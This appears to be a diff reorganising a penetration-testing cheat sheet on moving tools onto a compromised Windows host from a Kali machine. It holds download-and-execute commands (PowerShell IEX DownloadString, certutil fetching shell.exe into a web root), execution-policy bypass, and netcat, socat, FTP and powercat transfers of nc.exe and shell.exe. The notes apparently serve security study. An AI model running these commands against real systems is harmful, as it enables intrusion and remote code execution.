@@ -122,85 +122,7 @@ SMB Client
 $ \\<ip_server>\a\whoami.exe
 ```
 
-## FTP Server
-
-Install
-
-``` bash
-sudo apt-get install vsftpd
-sudo service vsftpd start
-```
-
-Anonymous access
-
-``` bash
-sudo nano /etc/vsftpd.conf
-
-=> anonymous_enable=YES
-```
-
-## Pure-FTPd
-
-setup-ftp.sh
-
-``` bash
-groupadd ftpgroup
-useradd -g ftpgroup -d /dev/null -s /etc ftpuser
-pure-pw useradd hades -u ftpuser -d /ftphome
-pure-pw mkdb
-cd /etc/pure-ftpd/auth/
-ln -s ../conf/PureDB 60pdb
-mkdir -p /ftphome
-chown -R ftpuser:ftpgroup /ftphome/
-systemctl restart pure-ftpd
-```
-
-ftp.txt
-
-``` bash
-open 192.168.11.140 21
-USER hades
-passwd
-bin
-GET nc.exe
-quit
-```
-
-``` bash
-ftp -v -n -s:ftp.txt
-```
-
-## Netcat
-
-Kali machine
-
-``` bash
-nc -nvlp 4444 < /usr/share/windows-resources/binaries/wget.exe
-```
-
-Windows machine
-
-``` bash
-nc -nv 192.168.11.130 4444 > wget.exe
-```
-
-## Socat
-
-Kali machine
-
-``` bash
-sudo socat TCP4-LISTEN:443,fork file:shell.exe
-```
-
-Windows machine
-
-``` bash
-socat TCP4:192.168.11.130:443 file:shell.exe,create
-```
-
-## Windows
-
-### PowerShell
+## PowerShell
 
 Kali machine
 
@@ -220,19 +142,25 @@ Executing a remote PowerShell script
 powershell.exe IEX (New-Object System.Net.WebClient).DownloadString('http://192.168.11.140/helloworld.ps1')
 ```
 
-### Powercat
+## Powercat
 
-Install
+=== "Bypass policy"
 
-``` powershell
-Set-ExecutionPolicy Unrestricted
+	``` powershell
+	Set-ExecutionPolicy Unrestricted
+	```
 
-# Internet
-iex (New-Object System.Net.Webclient).DownloadString('https://raw.githubusercontent.com/besimorhino/powercat/master/powercat.ps1')
+=== "Download and execute from internet"
 
-#Local
-. .\powercat.ps1
-```
+	``` powershell
+	iex (New-Object System.Net.Webclient).DownloadString('https://raw.githubusercontent.com/besimorhino/powercat/master/powercat.ps1')
+	```
+
+=== "Local machine"
+
+	``` powershell
+	. .\powercat.ps1
+	```
 
 Kali machine
 
@@ -246,7 +174,7 @@ Windows machine
 powercat -c 192.168.11.130 -p 443 -i C:\Users\Public\powercat.ps1
 ```
 
-### [VBScript](http://www.ericphelps.com/scripting/samples)
+## [VBScript](http://www.ericphelps.com/scripting/samples)
 
 === "command"
 
@@ -286,7 +214,7 @@ powercat -c 192.168.11.130 -p 443 -i C:\Users\Public\powercat.ps1
 	echo ts.Close >> wget.vbs
 	```
 
-### Hex String
+## Hex String
 
 Smaller file
 
@@ -296,4 +224,86 @@ upx -9 nc.exe
 
 ``` bash
 exe2hex -x nc.exe -p nc.cmd
+```
+
+## Certutil
+
+``` bash
+certutil.exe -urlcache -f http://<url>/shell.exe C:\\inetpub\\wwwroot\\shell.exe
+```
+
+## FTP Server
+
+Install
+
+``` bash
+sudo apt-get install vsftpd
+sudo service vsftpd start
+```
+
+Anonymous access
+
+``` bash
+sudo nano /etc/vsftpd.conf
+
+=> anonymous_enable=YES
+```
+
+## Netcat
+
+Kali machine
+
+``` bash
+nc -nvlp 4444 < /usr/share/windows-resources/binaries/wget.exe
+```
+
+Windows machine
+
+``` bash
+nc -nv 192.168.11.130 4444 > wget.exe
+```
+
+## Socat
+
+Kali machine
+
+``` bash
+sudo socat TCP4-LISTEN:443,fork file:shell.exe
+```
+
+Windows machine
+
+``` bash
+socat TCP4:192.168.11.130:443 file:shell.exe,create
+```
+
+## Pure-FTPd
+
+setup-ftp.sh
+
+``` bash
+groupadd ftpgroup
+useradd -g ftpgroup -d /dev/null -s /etc ftpuser
+pure-pw useradd hades -u ftpuser -d /ftphome
+pure-pw mkdb
+cd /etc/pure-ftpd/auth/
+ln -s ../conf/PureDB 60pdb
+mkdir -p /ftphome
+chown -R ftpuser:ftpgroup /ftphome/
+systemctl restart pure-ftpd
+```
+
+ftp.txt
+
+``` bash
+open 192.168.11.140 21
+USER hades
+passwd
+bin
+GET nc.exe
+quit
+```
+
+``` bash
+ftp -v -n -s:ftp.txt
 ```
